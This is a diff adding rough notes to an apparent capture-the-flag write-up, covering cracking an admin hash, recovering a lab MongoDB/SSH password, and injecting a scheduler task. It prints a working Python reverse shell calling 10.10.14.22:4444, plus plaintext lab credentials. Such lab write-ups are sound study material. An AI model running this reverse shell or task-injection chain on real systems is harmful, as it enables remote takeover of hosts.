@@ -40,7 +40,35 @@ Connection: close
 {% endhighlight %}
 
 You past lovers? I cared not.
+But an `admin` flag, is an `admin` flag, and must always be followed. Its hash looked weak.
+Indeed, it was. (https://crackstation.net)[Crackstation] revealed it secret was
+"manchester".
 
+
+download back up
+base64 decode into zip
+unzip, need password
+password via john - secret word
+backup_key = 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+mark password for mongo: 5AYRft73VtFpc84k and ssh
+/var/scheduler/app.js > runs mongo tasks
+db.auth("mark","5AYRft73VtFpc84k")
+insert tasks to print flag
+FIRST BLOOD BABY
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('10.10.14.22',4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(['/bin/sh','-i'])
+use scheduler to run
+db.tasks.insert({"_id":"1","cmd":"python /tmp/over/over.py"})
+get shell
+reverse backup to see that it blacklists characters and needs a key
+run from / and backup /root
+get key
+win
 
 
 _fin_
